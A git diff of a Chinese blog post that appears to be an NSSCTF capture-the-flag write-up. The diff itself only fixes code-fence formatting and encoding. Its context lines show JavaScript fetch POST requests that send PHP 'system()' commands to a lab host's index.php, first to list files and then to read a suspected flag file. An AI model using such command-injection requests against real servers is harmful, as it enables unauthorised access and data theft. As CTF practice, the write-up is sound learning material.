@@ -1,4 +1,4 @@
----
+﻿---
 title: "nssctf学习中"
 image: '/images/133301699_p0_master1200.jpg'
 pinned: false
@@ -200,7 +200,7 @@ drwxr-xr-x    1 root root 4096 Oct  6  2021 usr
 drwxr-xr-x    1 root root 4096 Jan 19  2022 var
 ```
 我靠，居然没看见flag相关的文件，那猫猫学长暂时不能出击了，再看看网站目录有没有
-```fetch('http://node4.anna.nssctf.cn:28048/index.php', {
+```javascript
     method: 'POST',
     headers: {'Content-Type': 'application/x-www-form-urlencoded'},
     body: 'cmd=system("ls -l");'
@@ -236,7 +236,7 @@ VM21: 7
 -rwxrwxrwx 1 root root    394 Aug 29  2020 index.php
 ```
 其实本来想用curl的，但是一直显示没连接上服务器，只能试一试JavaScript了，不过还好成功了，这里面返回了一个巨可疑的文件，bbbbbbbbb.txt，就是它，拿下
-```fetch('http://node4.anna.nssctf.cn:28048/index.php', {
+```javascript
     method: 'POST',
     headers: {'Content-Type': 'application/x-www-form-urlencoded'},
     body: 'cmd=system("cat bbbbbbbbb.txt");'
@@ -1205,3 +1205,4 @@ $conn->close();
 ---
 
 - **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
+
